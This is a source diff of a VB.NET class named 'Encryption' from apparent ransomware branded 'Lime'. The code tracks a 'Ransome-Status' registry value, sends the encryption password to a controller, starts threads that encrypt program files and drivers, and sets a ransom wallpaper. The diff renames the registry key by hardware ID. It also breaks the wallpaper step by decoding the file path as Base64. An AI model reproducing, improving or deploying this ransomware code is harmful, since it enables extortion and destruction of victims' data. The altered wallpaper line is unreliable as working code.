@@ -94,7 +94,7 @@ Public Class Encryption
     Public Sub startAction()
         Try
 
-            Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", Nothing)
+            Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Ransome-Status", Nothing)
             If readValue = "Encrypted" Or readValue = "Encryption in progress..." Or readValue = "Decryption in progress..." Then
                 Try
                     Main.C.Close()
@@ -108,7 +108,7 @@ Public Class Encryption
             Threading.Thread.CurrentThread.Sleep(1000)
             Main.Send("Key" + SPL + ID.Bot + SPL + password)
 
-            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", "Encryption in progress...")
+            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Ransome-Status", "Encryption in progress...")
 
             Dim T1 As New Threading.Thread(AddressOf Progfiles)
             Dim T2 As New Threading.Thread(AddressOf Fix_Drivers)
@@ -125,7 +125,7 @@ Public Class Encryption
             messageCreator()
             password = Nothing
 
-            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", "Encrypted")
+            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Ransome-Status", "Encrypted")
 
             SC()
 
@@ -168,9 +168,6 @@ Public Class Encryption
         num += 1
     End Sub
 
-    Private Const SPI_SETDESKWALLPAPER As Integer = &H14
-    Private Const SPIF_UPDATEINIFILE As Integer = &H1
-    Private Const SPIF_SENDWININICHANGE As Integer = &H2
     Private Declare Auto Function SystemParametersInfo Lib "user32.dll" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
     Public Sub messageCreator()
         Try
@@ -183,8 +180,12 @@ Public Class Encryption
 
 
             Dim MYW = IO.Path.GetTempPath + "\LimeWALL.jpeg"
-            File.WriteAllBytes(MYW, Convert.FromBase64String(Mywallpaper))
-            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, MYW, SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE)
+            File.WriteAllBytes(MYW, Convert.FromBase64String(MYW))
+
+            Dim SPI_SETDESKWALLPAPER As Integer = 20
+            Dim SPIF_UPDATEINIFILE As Integer = 1
+            Dim SPIF_SENDWININICHANGE As Integer = 2
+            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, MYW, (SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE))
         Catch ex As Exception
         End Try
     End Sub
